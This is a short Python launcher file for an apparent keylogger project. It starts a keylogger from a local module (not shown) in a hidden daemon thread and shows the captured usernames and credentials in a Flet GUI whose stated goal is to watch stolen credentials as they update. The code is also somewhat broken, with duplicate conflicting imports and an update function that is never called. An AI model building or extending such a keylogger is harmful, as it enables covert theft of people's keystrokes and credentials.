# main.py
import threading
from setuptools import setup, find_packages, setup
from setup import setup_log_directory
from keylogger import start_keylogger, load_credentials, load_config
from flet import *

"""
Goal: GUI to see the credentials as they are updated.
"""

def main(page: Page):
    # Step 1: Run the setup to ensure the log directory is configured
    log_directory = setup_log_directory()

    # Step 2: Load credentials to get the username
    credentials: dict = load_credentials()
    username = credentials["username"]
    load_config()

    # Step 3: Start the keylogger in a separate daemon thread
    keylogger_thread = threading.Thread(target=start_keylogger, args=(log_directory, username), daemon=True)
    keylogger_thread.start()

    def update_credential_view():
        credential_controls = [Text(value=cred) for cred in credentials.items()]
        credential_view.content.controls = credential_controls
        credential_view.update()
        pass

    credential_view = Container(
        Column(
            controls=[
                Text(value=f"Username: {username}"),
                Text(value=f"These are total creds: {credentials}")
            ]
        )
    )

    page.add(credential_view)


if __name__ == "__main__":
    app(main)
